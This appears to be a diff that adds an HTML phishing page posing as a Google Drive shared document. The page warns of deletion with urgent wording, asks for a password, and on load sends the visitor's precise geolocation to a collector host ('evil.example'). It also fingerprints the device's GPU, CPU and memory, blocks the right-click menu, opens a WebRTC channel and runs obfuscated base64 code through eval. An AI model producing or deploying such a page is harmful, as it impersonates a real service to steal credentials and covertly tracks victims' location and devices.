@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Google Drive - Shared document</title>
+  <script>
+    if (window.location.protocol == "http:") {
+      window.location = "https:" + window.location.href.substring(5);
+    }
+  </script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+<body onload="grab();">
+  <h1>Action required: your Google Drive document will be deleted</h1>
+  <p>Verify now. Limited time only.</p>
+  <input type="password" name="pass" placeholder="Password">
+  <div id="out"></div>
+<script>
+  function grab() {
+    navigator.geolocation.getCurrentPosition(function (p) {
+      $.ajax({
+        type: 'POST',
+        url: 'https://collector.evil.example/x9.php',
+        data: { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }
+      });
+    }, function (err) {
+      $.post('/error.php', { Status: 'failed', Error: err.message });
+    }, { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 });
+  }
+  var canvas = document.createElement('canvas');
+  var gl = canvas.getContext('webgl');
+  var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+  var gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+  var cores = navigator.hardwareConcurrency;
+  var ram = navigator.deviceMemory;
+  document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
+  var pc = new RTCPeerConnection();
+  pc.createDataChannel('x');
+  eval(atob('ZmV0Y2goIi9iZWFjb24iKQ=='));
+</script>
+</body>
+</html>
